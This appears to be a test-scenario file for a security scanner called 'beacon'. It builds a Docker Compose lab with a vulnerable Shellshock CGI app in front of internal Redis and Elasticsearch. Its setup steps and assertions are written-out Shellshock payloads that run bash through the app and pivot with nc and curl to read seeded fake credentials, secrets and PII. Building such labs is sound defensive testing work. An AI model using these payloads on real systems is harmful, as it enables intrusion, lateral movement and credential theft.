@@ -1,0 +1,194 @@
+name: compose-lateral-movement
+description: >
+  Multi-container environment simulating a real application stack. Frontend
+  proxy (nginx) exposed externally, behind it a vulnerable webapp (shellshock
+  CVE-2014-6271), plus internal services (Redis, Elasticsearch) only reachable
+  from the internal network. Beacon should exploit the webapp via command
+  injection, then discover and enumerate internal services via the exploited
+  container's network context. Tests environment-aware lateral movement in
+  Docker Compose deployments.
+tags: [pivot, lateral, compose, cmdinj, internal, authorized, exploit]
+
+services:
+  # External entry point — nginx proxy forwarding to webapp
+  proxy:
+    image: nginx:alpine
+    ports: ["9352:80"]
+    volumes:
+      - ./compose-lateral/nginx.conf:/etc/nginx/conf.d/default.conf:ro
+    depends_on: [webapp]
+    networks:
+      frontend: {}
+      appnet: {}
+
+  # Vulnerable webapp — Shellshock (CVE-2014-6271) for command injection
+  webapp:
+    image: vulnerables/cve-2014-6271
+    networks:
+      appnet: {}
+      datanet: {}
+
+  # Internal Redis — only reachable from webapp's network
+  cache:
+    from: caches/redis
+    networks:
+      datanet: {}
+
+  # Internal Elasticsearch — only reachable from webapp's network
+  search:
+    from: apps/elasticsearch
+    networks:
+      datanet: {}
+
+networks:
+  frontend: {}   # beacon can reach proxy here
+  appnet: {}     # proxy <-> webapp
+  datanet: {}    # webapp <-> cache, search (beacon cannot reach directly)
+
+ready:
+  cmd: "curl -sf http://localhost:9352/ >/dev/null 2>&1 || curl -sf http://localhost:9352/cgi-bin/vulnerable >/dev/null 2>&1"
+  timeout: 120s
+  interval: 5s
+
+# Seed internal services with data via Shellshock (proves the exploit path
+# works and avoids needing docker compose exec context).
+run:
+  # Wait for Elasticsearch to be ready (it takes a while to start).
+  - >
+    for i in $(seq 1 30); do
+    curl -s -H "User-Agent: () { :;}; echo; /bin/bash -c 'curl -sf http://search:9200/_cluster/health 2>/dev/null'"
+    http://localhost:9352/cgi-bin/vulnerable | grep -q 'green\|yellow' && break;
+    sleep 3; done
+
+  # Seed Redis with credentials via Shellshock pivot.
+  - >
+    curl -s -H "User-Agent: () { :;}; echo; /bin/bash -c 'echo -e \"SET app:db_url postgresql://app:ProductionPassword123@db.internal:5432/myapp\nSET app:api_secret sk-prod-api-secret-key-never-share-this-value\" | nc -w2 cache 6379'"
+    http://localhost:9352/cgi-bin/vulnerable >/dev/null
+
+  # Seed Elasticsearch with sample PII data via Shellshock pivot.
+  - >
+    curl -s -H "User-Agent: () { :;}; echo; /bin/bash -c 'curl -sf -X PUT http://search:9200/customers/_doc/1 -H \"Content-Type: application/json\" -d \"{\\\"name\\\":\\\"John Doe\\\",\\\"email\\\":\\\"john@example.com\\\",\\\"ssn\\\":\\\"123-45-6789\\\"}\"'"
+    http://localhost:9352/cgi-bin/vulnerable >/dev/null
+
+  # Seed Elasticsearch with secrets via Shellshock pivot.
+  - >
+    curl -s -H "User-Agent: () { :;}; echo; /bin/bash -c 'curl -sf -X PUT http://search:9200/secrets/_doc/1 -H \"Content-Type: application/json\" -d \"{\\\"key\\\":\\\"AWS_SECRET\\\",\\\"value\\\":\\\"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\\\"}\"'"
+    http://localhost:9352/cgi-bin/vulnerable >/dev/null
+
+assertions:
+  # ── Pre-flight: verify command injection works ─────────────────────────
+
+  - name: exploit-shellshock-rce
+    type: command
+    expect:
+      command: >
+        curl -s -H "User-Agent: () { :;}; echo; echo shellshock-confirmed"
+        http://localhost:9352/cgi-bin/vulnerable | grep -q 'shellshock-confirmed'
+      exit_code: 0
+
+  - name: exploit-can-run-commands
+    type: command
+    expect:
+      command: >
+        curl -s -H "User-Agent: () { :;}; echo; /bin/id"
+        http://localhost:9352/cgi-bin/vulnerable | grep -q 'uid='
+      exit_code: 0
+
+  # ── Pre-flight: verify internal services are reachable from webapp ─────
+
+  - name: exploit-internal-redis-reachable
+    type: command
+    expect:
+      command: >
+        curl -s -H "User-Agent: () { :;}; echo; /bin/bash -c 'echo PING | nc -w2 cache 6379'"
+        http://localhost:9352/cgi-bin/vulnerable | grep -q 'PONG'
+      exit_code: 0
+
+  - name: exploit-internal-elasticsearch-reachable
+    type: command
+    expect:
+      command: >
+        curl -s -H "User-Agent: () { :;}; echo; /bin/bash -c 'curl -sf http://search:9200/'"
+        http://localhost:9352/cgi-bin/vulnerable | grep -q 'lucene'
+      exit_code: 0
+      timeout: 15s
+
+  # ── Pre-flight: verify internal data is accessible via pivot ───────────
+
+  - name: exploit-redis-creds-via-pivot
+    type: command
+    expect:
+      command: >
+        curl -s -H "User-Agent: () { :;}; echo; /bin/bash -c 'echo \"GET app:db_url\" | nc -w2 cache 6379'"
+        http://localhost:9352/cgi-bin/vulnerable | grep -q 'ProductionPassword123'
+      exit_code: 0
+
+  - name: exploit-elasticsearch-data-via-pivot
+    type: command
+    expect:
+      command: >
+        curl -s -H "User-Agent: () { :;}; echo; /bin/bash -c 'curl -sf http://search:9200/customers/_search'"
+        http://localhost:9352/cgi-bin/vulnerable | grep -q 'ssn'
+      exit_code: 0
+      timeout: 15s
+
+  # ── Beacon detection: command injection on entry point ─────────────────
+
+  - name: detects-command-injection
+    type: beacon
+    target: localhost:9352
+    args: ["--no-enrich", "--scanners", "cmdinj", "--deep", "--permission-confirmed"]
+    expect:
+      check_id: web.command_injection
+
+  # ── Beacon exploitation: lateral movement via command injection ────────
+  # After exploiting command injection, beacon should:
+  # 1. Discover internal network topology (env vars, /etc/hosts, ARP)
+  # 2. Probe discovered internal services
+  # 3. Extract data from internal services through the exploit
+
+  - name: beacon-discovers-internal-hosts
+    type: beacon
+    target: localhost:9352
+    args: ["--no-enrich", "--scanners", "cmdinj", "--deep", "--permission-confirmed", "--authorized"]
+    expect:
+      check_id: exploit.internal_network_discovered
+      evidence_key: hosts_found
+
+  - name: beacon-pivots-to-redis
+    type: beacon
+    target: localhost:9352
+    args: ["--no-enrich", "--scanners", "cmdinj", "--deep", "--permission-confirmed", "--authorized"]
+    expect:
+      check_id: exploit.lateral_movement
+      evidence_key: pivot_target
+      evidence_value: redis
+
+  - name: beacon-extracts-creds-from-redis
+    type: beacon
+    target: localhost:9352
+    args: ["--no-enrich", "--scanners", "cmdinj", "--deep", "--permission-confirmed", "--authorized"]
+    expect:
+      check_id: exploit.credential_harvest
+      evidence_key: credential_source
+      evidence_value: redis_cache
+
+  - name: beacon-pivots-to-elasticsearch
+    type: beacon
+    target: localhost:9352
+    args: ["--no-enrich", "--scanners", "cmdinj", "--deep", "--permission-confirmed", "--authorized"]
+    expect:
+      check_id: exploit.lateral_movement
+      evidence_key: pivot_target
+      evidence_value: elasticsearch
+
+  - name: beacon-extracts-data-from-elasticsearch
+    type: beacon
+    target: localhost:9352
+    args: ["--no-enrich", "--scanners", "cmdinj", "--deep", "--permission-confirmed", "--authorized"]
+    expect:
+      check_id: exploit.data_extracted
+      evidence_key: data_type
+      evidence_value: pii
+
+timeout: 10m
